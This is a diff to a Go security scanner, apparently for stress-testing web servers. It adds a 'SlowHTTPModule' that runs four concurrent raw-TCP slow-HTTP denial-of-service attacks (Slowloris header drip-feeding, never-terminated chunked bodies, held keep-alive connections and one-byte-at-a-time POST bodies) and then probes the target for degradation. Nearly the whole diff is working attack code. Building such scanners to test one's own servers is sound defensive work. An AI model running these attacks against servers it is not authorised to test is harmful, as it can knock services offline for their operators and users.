@@ -3,8 +3,15 @@ package attacks
 import (
 	"bytes"
 	"compress/gzip"
+	"context"
 	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"net/url"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/glitchWebServer/internal/scanner"
 )
@@ -679,4 +686,556 @@ func (m *SlowHTTPModule) compressionBomb() []scanner.AttackRequest {
 	})
 
 	return reqs
+}
+
+// ---------------------------------------------------------------------------
+// Raw TCP Socket Attacks — bypass Go's net/http to send malformed data
+// ---------------------------------------------------------------------------
+
+// RawSocketConfig holds parameters for the raw TCP attack methods.
+type RawSocketConfig struct {
+	Concurrency int           // number of parallel connections per attack type
+	Timeout     time.Duration // per-connection timeout
+}
+
+// Run executes raw TCP socket attacks against the target that bypass Go's
+// net/http client. These attacks open raw TCP connections and send partial,
+// malformed, or slow data to exhaust server resources. The target should
+// include scheme and host (e.g. "http://localhost:8765"). Returns findings
+// when degradation is detected.
+func (m *SlowHTTPModule) Run(ctx context.Context, target string, cfg RawSocketConfig) []scanner.Finding {
+	if cfg.Concurrency <= 0 {
+		cfg.Concurrency = 10
+	}
+	if cfg.Timeout <= 0 {
+		cfg.Timeout = 30 * time.Second
+	}
+
+	parsed, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	host := parsed.Host
+	if !strings.Contains(host, ":") {
+		if parsed.Scheme == "https" {
+			host += ":443"
+		} else {
+			host += ":80"
+		}
+	}
+
+	var (
+		mu       sync.Mutex
+		findings []scanner.Finding
+	)
+	addFinding := func(f scanner.Finding) {
+		mu.Lock()
+		findings = append(findings, f)
+		mu.Unlock()
+	}
+
+	// Track all connections so we can close them on context cancellation.
+	var (
+		connMu sync.Mutex
+		conns  []net.Conn
+	)
+	trackConn := func(c net.Conn) {
+		connMu.Lock()
+		conns = append(conns, c)
+		connMu.Unlock()
+	}
+
+	// Run all attack types concurrently.
+	var wg sync.WaitGroup
+
+	// 1. True Slowloris — partial headers, one byte every 10s
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		results := m.rawSlowloris(ctx, host, parsed.Host, cfg)
+		for _, c := range results.conns {
+			trackConn(c)
+		}
+		for _, f := range results.findings {
+			addFinding(f)
+		}
+	}()
+
+	// 2. Incomplete chunked encoding
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		results := m.rawChunkedHold(ctx, host, parsed.Host, cfg)
+		for _, c := range results.conns {
+			trackConn(c)
+		}
+		for _, f := range results.findings {
+			addFinding(f)
+		}
+	}()
+
+	// 3. Keep-alive connection holding (idle connection exhaustion)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		results := m.rawKeepAliveHold(ctx, host, parsed.Host, cfg)
+		for _, c := range results.conns {
+			trackConn(c)
+		}
+		for _, f := range results.findings {
+			addFinding(f)
+		}
+	}()
+
+	// 4. Slow POST body — send one byte at a time
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		results := m.rawSlowPostBody(ctx, host, parsed.Host, cfg)
+		for _, c := range results.conns {
+			trackConn(c)
+		}
+		for _, f := range results.findings {
+			addFinding(f)
+		}
+	}()
+
+	// Wait for all attacks to finish or context cancellation.
+	done := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-ctx.Done():
+	}
+
+	// Health probe: check if the target is still responding after attacks.
+	degraded, probeLatency := m.probeHealth(target, cfg.Timeout)
+	if degraded {
+		addFinding(scanner.Finding{
+			Category:    "Slow-HTTP",
+			Severity:    "high",
+			URL:         target,
+			Method:      "GET",
+			StatusCode:  0,
+			Evidence:    fmt.Sprintf("Health probe failed or slow (latency: %v) after raw socket attacks", probeLatency),
+			Description: "Target appears degraded after raw TCP socket attacks — possible connection exhaustion or resource starvation",
+		})
+	}
+
+	// Close all held connections.
+	connMu.Lock()
+	for _, c := range conns {
+		c.Close()
+	}
+	connMu.Unlock()
+
+	return findings
+}
+
+// rawAttackResult holds connections and findings from a raw attack.
+type rawAttackResult struct {
+	conns    []net.Conn
+	findings []scanner.Finding
+}
+
+// ---------------------------------------------------------------------------
+// rawSlowloris — true Slowloris: send partial HTTP headers, one byte at a time
+// ---------------------------------------------------------------------------
+
+func (m *SlowHTTPModule) rawSlowloris(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
+	var result rawAttackResult
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for i := 0; i < cfg.Concurrency; i++ {
+		wg.Add(1)
+		go func(connID int) {
+			defer wg.Done()
+
+			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
+			if err != nil {
+				return
+			}
+
+			mu.Lock()
+			result.conns = append(result.conns, conn)
+			mu.Unlock()
+
+			// Send initial request line and Host header.
+			initial := fmt.Sprintf("GET /?slowloris=%d HTTP/1.1\r\nHost: %s\r\n", connID, hostHeader)
+			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+			_, err = conn.Write([]byte(initial))
+			if err != nil {
+				return
+			}
+
+			// Now drip-feed one header byte every 10 seconds to keep the
+			// connection open. The server is waiting for \r\n\r\n to end
+			// the headers, which we never send.
+			headerNum := 0
+			ticker := time.NewTicker(10 * time.Second)
+			defer ticker.Stop()
+
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					headerLine := fmt.Sprintf("X-Slowloris-%d: keep-alive\r\n", headerNum)
+					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+					_, err := conn.Write([]byte(headerLine))
+					if err != nil {
+						// Server closed the connection — that's a finding
+						// if it happened early (server may have a timeout).
+						mu.Lock()
+						result.findings = append(result.findings, scanner.Finding{
+							Category:    "Slow-HTTP",
+							Severity:    "info",
+							URL:         fmt.Sprintf("tcp://%s/?slowloris=%d", addr, connID),
+							Method:      "RAW-TCP",
+							StatusCode:  0,
+							Evidence:    fmt.Sprintf("Connection closed after %d slow headers: %v", headerNum, err),
+							Description: fmt.Sprintf("Slowloris raw TCP: server closed connection after %d drip-fed headers (10s interval)", headerNum),
+						})
+						mu.Unlock()
+						return
+					}
+					headerNum++
+				}
+			}
+		}(i)
+	}
+
+	// Let the attack run for the timeout duration or until cancelled.
+	select {
+	case <-ctx.Done():
+	case <-time.After(cfg.Timeout):
+	}
+
+	return result
+}
+
+// ---------------------------------------------------------------------------
+// rawChunkedHold — send incomplete chunked encoding, never finish
+// ---------------------------------------------------------------------------
+
+func (m *SlowHTTPModule) rawChunkedHold(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
+	var result rawAttackResult
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for i := 0; i < cfg.Concurrency; i++ {
+		wg.Add(1)
+		go func(connID int) {
+			defer wg.Done()
+
+			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
+			if err != nil {
+				return
+			}
+
+			mu.Lock()
+			result.conns = append(result.conns, conn)
+			mu.Unlock()
+
+			// Send a complete POST request with chunked encoding, but
+			// never send the terminal "0\r\n\r\n" chunk.
+			req := fmt.Sprintf(
+				"POST /?chunked_hold=%d HTTP/1.1\r\n"+
+					"Host: %s\r\n"+
+					"Transfer-Encoding: chunked\r\n"+
+					"Content-Type: text/plain\r\n"+
+					"Connection: keep-alive\r\n"+
+					"\r\n"+
+					"1\r\nX\r\n",
+				connID, hostHeader,
+			)
+
+			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+			_, err = conn.Write([]byte(req))
+			if err != nil {
+				return
+			}
+
+			// Drip-feed tiny chunks every 15 seconds to keep connection alive,
+			// but never send the zero-length terminator.
+			chunkNum := 0
+			ticker := time.NewTicker(15 * time.Second)
+			defer ticker.Stop()
+
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					chunk := "1\r\nX\r\n" // valid 1-byte chunk
+					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+					_, err := conn.Write([]byte(chunk))
+					if err != nil {
+						mu.Lock()
+						result.findings = append(result.findings, scanner.Finding{
+							Category:    "Slow-HTTP",
+							Severity:    "info",
+							URL:         fmt.Sprintf("tcp://%s/?chunked_hold=%d", addr, connID),
+							Method:      "RAW-TCP",
+							StatusCode:  0,
+							Evidence:    fmt.Sprintf("Connection closed after %d incomplete chunks: %v", chunkNum, err),
+							Description: fmt.Sprintf("Chunked hold raw TCP: server closed connection after %d drip-fed chunks (15s interval)", chunkNum),
+						})
+						mu.Unlock()
+						return
+					}
+					chunkNum++
+				}
+			}
+		}(i)
+	}
+
+	select {
+	case <-ctx.Done():
+	case <-time.After(cfg.Timeout):
+	}
+
+	return result
+}
+
+// ---------------------------------------------------------------------------
+// rawKeepAliveHold — complete a request, then hold the keep-alive connection
+// ---------------------------------------------------------------------------
+
+func (m *SlowHTTPModule) rawKeepAliveHold(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
+	var result rawAttackResult
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for i := 0; i < cfg.Concurrency; i++ {
+		wg.Add(1)
+		go func(connID int) {
+			defer wg.Done()
+
+			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
+			if err != nil {
+				return
+			}
+
+			mu.Lock()
+			result.conns = append(result.conns, conn)
+			mu.Unlock()
+
+			// Send a valid HTTP request with keep-alive.
+			req := fmt.Sprintf(
+				"GET /?keepalive_hold=%d HTTP/1.1\r\n"+
+					"Host: %s\r\n"+
+					"Connection: keep-alive\r\n"+
+					"Keep-Alive: timeout=600, max=99999\r\n"+
+					"\r\n",
+				connID, hostHeader,
+			)
+
+			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+			_, err = conn.Write([]byte(req))
+			if err != nil {
+				return
+			}
+
+			// Read the response (drain it) but don't send a second request.
+			// The connection stays open, consuming a server slot.
+			conn.SetReadDeadline(time.Now().Add(cfg.Timeout))
+			buf := make([]byte, 4096)
+			for {
+				_, readErr := conn.Read(buf)
+				if readErr != nil {
+					break
+				}
+			}
+
+			// Now just hold the connection open. Send a single byte every
+			// 30 seconds to prevent idle timeout.
+			ticker := time.NewTicker(30 * time.Second)
+			defer ticker.Stop()
+
+			holdTime := 0
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					holdTime += 30
+					// Try to send another request to reset the idle timer.
+					keepReq := fmt.Sprintf(
+						"GET /?keepalive_ping=%d&t=%d HTTP/1.1\r\n"+
+							"Host: %s\r\n"+
+							"Connection: keep-alive\r\n"+
+							"\r\n",
+						connID, holdTime, hostHeader,
+					)
+					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+					_, err := conn.Write([]byte(keepReq))
+					if err != nil {
+						mu.Lock()
+						result.findings = append(result.findings, scanner.Finding{
+							Category:    "Slow-HTTP",
+							Severity:    "info",
+							URL:         fmt.Sprintf("tcp://%s/?keepalive_hold=%d", addr, connID),
+							Method:      "RAW-TCP",
+							StatusCode:  0,
+							Evidence:    fmt.Sprintf("Keep-alive connection dropped after %ds: %v", holdTime, err),
+							Description: fmt.Sprintf("Keep-alive hold raw TCP: server closed idle connection after %ds", holdTime),
+						})
+						mu.Unlock()
+						return
+					}
+					// Drain response.
+					conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+					for {
+						_, readErr := conn.Read(buf)
+						if readErr != nil {
+							break
+						}
+					}
+				}
+			}
+		}(i)
+	}
+
+	select {
+	case <-ctx.Done():
+	case <-time.After(cfg.Timeout):
+	}
+
+	return result
+}
+
+// ---------------------------------------------------------------------------
+// rawSlowPostBody — send POST with large Content-Length, drip-feed the body
+// ---------------------------------------------------------------------------
+
+func (m *SlowHTTPModule) rawSlowPostBody(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
+	var result rawAttackResult
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for i := 0; i < cfg.Concurrency; i++ {
+		wg.Add(1)
+		go func(connID int) {
+			defer wg.Done()
+
+			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
+			if err != nil {
+				return
+			}
+
+			mu.Lock()
+			result.conns = append(result.conns, conn)
+			mu.Unlock()
+
+			// Send headers with a large Content-Length, then drip-feed the
+			// body one byte at a time.
+			req := fmt.Sprintf(
+				"POST /?slow_post=%d HTTP/1.1\r\n"+
+					"Host: %s\r\n"+
+					"Content-Type: application/x-www-form-urlencoded\r\n"+
+					"Content-Length: 1048576\r\n"+
+					"Connection: keep-alive\r\n"+
+					"\r\n",
+				connID, hostHeader,
+			)
+
+			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+			_, err = conn.Write([]byte(req))
+			if err != nil {
+				return
+			}
+
+			// Send one byte every 10 seconds. The server is waiting for the
+			// full 1MB body that will never arrive.
+			bytesSent := 0
+			ticker := time.NewTicker(10 * time.Second)
+			defer ticker.Stop()
+
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
+					_, err := conn.Write([]byte("A"))
+					if err != nil {
+						mu.Lock()
+						result.findings = append(result.findings, scanner.Finding{
+							Category:    "Slow-HTTP",
+							Severity:    "info",
+							URL:         fmt.Sprintf("tcp://%s/?slow_post=%d", addr, connID),
+							Method:      "RAW-TCP",
+							StatusCode:  0,
+							Evidence:    fmt.Sprintf("Connection closed after %d bytes of 1MB body: %v", bytesSent, err),
+							Description: fmt.Sprintf("Slow POST body raw TCP: server closed after %d bytes sent (10s/byte, declared 1MB)", bytesSent),
+						})
+						mu.Unlock()
+						return
+					}
+					bytesSent++
+				}
+			}
+		}(i)
+	}
+
+	select {
+	case <-ctx.Done():
+	case <-time.After(cfg.Timeout):
+	}
+
+	return result
+}
+
+// ---------------------------------------------------------------------------
+// probeHealth — check if the target is still responsive after attacks
+// ---------------------------------------------------------------------------
+
+// probeHealth makes a simple HTTP GET to the target and returns whether the
+// target appears degraded (unreachable or very slow) along with the observed
+// latency. It tries up to 3 times with a short timeout.
+func (m *SlowHTTPModule) probeHealth(target string, timeout time.Duration) (degraded bool, latency time.Duration) {
+	probeTimeout := 5 * time.Second
+	if probeTimeout > timeout {
+		probeTimeout = timeout
+	}
+
+	client := &http.Client{
+		Timeout: probeTimeout,
+		// Do not follow redirects.
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	var totalLatency time.Duration
+	failures := 0
+
+	for attempt := 0; attempt < 3; attempt++ {
+		start := time.Now()
+		resp, err := client.Get(target + "/")
+		elapsed := time.Since(start)
+		totalLatency += elapsed
+
+		if err != nil {
+			failures++
+			continue
+		}
+		io.Copy(io.Discard, resp.Body)
+		resp.Body.Close()
+
+		// If the response is very slow (> 3s for a simple GET), count as degraded.
+		if elapsed > 3*time.Second {
+			failures++
+		}
+	}
+
+	avgLatency := totalLatency / 3
+
+	// If 2+ out of 3 probes failed or were slow, target is degraded.
+	return failures >= 2, avgLatency
 }
